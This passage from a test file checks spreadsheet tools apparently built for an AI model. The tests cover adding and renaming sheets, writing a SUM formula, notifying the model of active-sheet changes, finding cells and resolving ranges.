    expect(wb.getValue(id, 0, 1)).toBe('Item');
    expect(JSON.parse(run('manage_sheet', { action: 'add', sheet: 'Summary' }).content).added).toBe('Summary');
    expect(run('manage_sheet', { action: 'rename', sheet: 'Summary', new_name: 'Totals' }).ok).toBe(true);
    expect(wb.sheetByName('Totals')).toBeTruthy();
    expect(run('write_cells', { start_cell: 'Totals!A1', values: [['=SUM(Sheet1!C2:C4)']] }).ok).toBe(true);
    expect(wb.getValue(wb.sheetByName('Totals').id, 0, 0)).toBe(10);
  });

  it('tells the model when a tool changes which sheet unqualified ranges mean', () => {
    const wb = new Workbook();
    const env = { sheetId: () => wb.activeSheetId };
    const added = runTool(wb, 'manage_sheet', { action: 'add', sheet: 'Summary' }, env);
    expect(added.content).toMatch(/active sheet is now "Summary"/);
    expect(runTool(wb, 'write_cells', { start_cell: 'A1', values: [[1]] }, env).content).not.toMatch(/active sheet/);
  });

  it('finds cells by value or formula', () => {
    const { run } = setup();
    expect(JSON.parse(run('find', { query: 'PE' }).content).matches).toEqual([{ cell: 'Sheet1!A3', text: 'Pears' }]);
    expect(JSON.parse(run('find', { query: 'zzz' }).content).note).toBe('No cells match.');
  });

  it('resolves ranges on other sheets, names and tables', () => {
    const { wb, id } = setup();
    expect(resolveRange(wb, 'Sheet1!B2:C3', id).range).toEqual({ r1: 1, c1: 1, r2: 2, c2: 2 });
    expect(() => resolveRange(wb, 'not a range', id)).toThrow(ToolError);
  });
});
